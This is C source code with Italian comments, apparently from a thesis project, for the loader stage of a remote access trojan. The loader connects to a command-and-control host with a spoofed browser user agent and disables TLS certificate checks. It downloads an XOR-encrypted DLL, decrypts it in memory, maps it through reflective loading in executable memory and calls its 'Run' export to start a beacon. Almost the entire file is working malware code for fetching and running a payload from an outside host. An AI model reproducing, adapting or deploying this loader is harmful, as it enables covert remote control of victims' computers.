/*
 * test_loader.c v5 — chiave XOR hardcoded a compile time
 * La chiave non viaggia mai su rete — piu sicuro
 * Scarica DLL cifrata, decifra in RAM, chiama ReflectiveLoader
 *
 * Giuseppe Mangiola — Tesi RAT, 2026
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")

#define C2_HOST L"192.168.122.47"
#define C2_PORT 443

/* ── Chiave XOR hardcoded — generata a compile time ─────────
 * Non viaggia mai su rete — il server usa la stessa chiave
 * per cifrare la DLL prima di servirla.
 */
static const BYTE XOR_KEY[] = {
    0xD6, 0x83, 0xF9, 0xCE, 0x3E, 0x3D, 0x09, 0x12,
    0x15, 0xB4, 0x22, 0xCF, 0xEF, 0x50, 0x9F, 0x00,
    0x27, 0x98, 0x15, 0xC0, 0xEE, 0x74, 0x51, 0x68,
    0x7C, 0x61, 0x55, 0x99, 0xE7, 0x43, 0xEE, 0x28
};
static const DWORD XOR_KEY_SZ = 32;

typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)(LPVOID);

/* ── Ignora TLS self-signed ──────────────────────────────── */
static void _ignore_tls(HINTERNET hReq) {
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS,
                     &flags, sizeof(flags));
}

/* ── HTTP GET binario ─────────────────────────────────────── */
static BYTE* http_get_binary(LPCWSTR path, DWORD* out_size) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    BYTE* buf = NULL;
    DWORD total = 0, nread = 0;
    BYTE  tmp[4096];

    *out_size = 0;

    hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/124.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto cleanup;

    hConn = WinHttpConnect(hSess, C2_HOST, C2_PORT, 0);
    if (!hConn) goto cleanup;

    hReq = WinHttpOpenRequest(hConn, L"GET", path, NULL,
                              WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
    if (!hReq) goto cleanup;

    _ignore_tls(hReq);

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS,
                            0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hReq, NULL)) goto cleanup;

    buf = (BYTE*)malloc(1);
    while (WinHttpReadData(hReq, tmp, sizeof(tmp), &nread) && nread > 0) {
        BYTE* nb = (BYTE*)realloc(buf, total + nread);
        if (!nb) { free(buf); buf = NULL; goto cleanup; }
        buf = nb;
        memcpy(buf + total, tmp, nread);
        total += nread;
    }
    *out_size = total;

cleanup:
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return buf;
}

/* ── XOR decifratura in memoria ──────────────────────────── */
static void xor_decrypt(BYTE* data, DWORD size) {
    for (DWORD i = 0; i < size; i++)
        data[i] ^= XOR_KEY[i % XOR_KEY_SZ];
}

/* ── Trova ReflectiveLoader nell export table ────────────── */
static REFLECTIVELOADER find_loader(BYTE* pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt =
        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD expVA = pNt->OptionalHeader
                 .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                 .VirtualAddress;
    if (!expVA) return NULL;

    /* RVA → offset file tramite sezioni */
    #define RVA2PTR(rva) ({ \
        BYTE* _r = NULL; \
        PIMAGE_SECTION_HEADER _s = IMAGE_FIRST_SECTION(pNt); \
        for (WORD _i=0; _i<pNt->FileHeader.NumberOfSections; _i++,_s++) \
            if ((DWORD)(rva)>=_s->VirtualAddress && \
                (DWORD)(rva)<_s->VirtualAddress+_s->SizeOfRawData) \
                { _r=pBase+_s->PointerToRawData+((DWORD)(rva)-_s->VirtualAddress); break; } \
        _r; })

    PIMAGE_EXPORT_DIRECTORY pExp =
        (PIMAGE_EXPORT_DIRECTORY)RVA2PTR(expVA);
    if (!pExp) return NULL;

    DWORD* pNames = (DWORD*)RVA2PTR(pExp->AddressOfNames);
    WORD*  pOrds  = (WORD* )RVA2PTR(pExp->AddressOfNameOrdinals);
    DWORD* pFuncs = (DWORD*)RVA2PTR(pExp->AddressOfFunctions);
    if (!pNames || !pOrds || !pFuncs) return NULL;

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char* name = (char*)RVA2PTR(pNames[i]);
        if (name && strcmp(name, "ReflectiveLoader") == 0)
            return (REFLECTIVELOADER)RVA2PTR(pFuncs[pOrds[i]]);
    }
    return NULL;
}

/* ── Entry point ─────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int n) {
    (void)h; (void)p; (void)cmd; (void)n;

    /* 1. Scarica DLL cifrata dal C2 */
    DWORD enc_sz = 0;
    BYTE* enc = http_get_binary(L"/update_dll", &enc_sz);
    if (!enc || enc_sz == 0) goto fail;

    /* 2. Decifra XOR in memoria — chiave hardcoded, non su rete */
    xor_decrypt(enc, enc_sz);

    /* 3. Alloca memoria RWX e copia buffer decifrato */
    BYTE* pRaw = (BYTE*)VirtualAlloc(NULL, enc_sz,
                  MEM_RESERVE|MEM_COMMIT,
                  PAGE_EXECUTE_READWRITE);
    if (!pRaw) goto fail;
    memcpy(pRaw, enc, enc_sz);

    /* Pulisce il buffer cifrato dalla memoria */
    SecureZeroMemory(enc, enc_sz);
    free(enc); enc = NULL;

    /* 4. Trova e chiama ReflectiveLoader */
    REFLECTIVELOADER pLoader = find_loader(pRaw);
    if (!pLoader) goto fail;

    /* ReflectiveLoader mappa la DLL in memoria e chiama DllMain.
     * Ritorna uiBase (indirizzo della DLL mappata) oppure un codice
     * di errore < 10 se qualcosa va storto.
     * DllMain fa solo DisableThreadLibraryCalls — il payload NON parte ancora.
     */
    ULONG_PTR uiBase = pLoader(pRaw);
    if (uiBase < 0x10000) goto fail;   /* sanity: < 64 KB = codice errore */

    /* 5. Trova ed esegui l'export "Run" nella DLL già mappata in memoria.
     * Non possiamo usare GetProcAddress (la DLL non è nel PEB), quindi
     * parsiamo manualmente la export table dell'immagine mappata a uiBase.
     *
     * "Run" avvia payload_thread e chiama WaitForSingleObject(INFINITE):
     * non ritorna mai.
     */
    {
        typedef void (WINAPI * PFNRUN)(HWND, HINSTANCE, LPSTR, int);
        PFNRUN pRun = NULL;

        PIMAGE_DOS_HEADER pDos2 = (PIMAGE_DOS_HEADER)uiBase;
        PIMAGE_NT_HEADERS pNt2  = (PIMAGE_NT_HEADERS)(uiBase + pDos2->e_lfanew);
        DWORD expVA2 = pNt2->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                       .VirtualAddress;
        if (expVA2) {
            PIMAGE_EXPORT_DIRECTORY pExp2 =
                (PIMAGE_EXPORT_DIRECTORY)(uiBase + expVA2);
            DWORD *pNames2 = (DWORD *)(uiBase + pExp2->AddressOfNames);
            WORD  *pOrds2  = (WORD  *)(uiBase + pExp2->AddressOfNameOrdinals);
            DWORD *pFuncs2 = (DWORD *)(uiBase + pExp2->AddressOfFunctions);

            for (DWORD i = 0; i < pExp2->NumberOfNames; i++) {
                char *nm = (char *)(uiBase + pNames2[i]);
                if (nm && strcmp(nm, "Run") == 0) {
                    pRun = (PFNRUN)(uiBase + pFuncs2[pOrds2[i]]);
                    break;
                }
            }
        }

        if (!pRun) goto fail;
        /* Run() avvia il beacon thread e non ritorna mai */
        pRun(NULL, (HINSTANCE)uiBase, NULL, 0);
    }

    /* mai raggiunto — Run blocca su WaitForSingleObject(INFINITE) */
    Sleep(INFINITE);
    return 0;

fail:
    if (enc) { SecureZeroMemory(enc, enc_sz); free(enc); }
    Sleep(INFINITE);
    return 1;
}
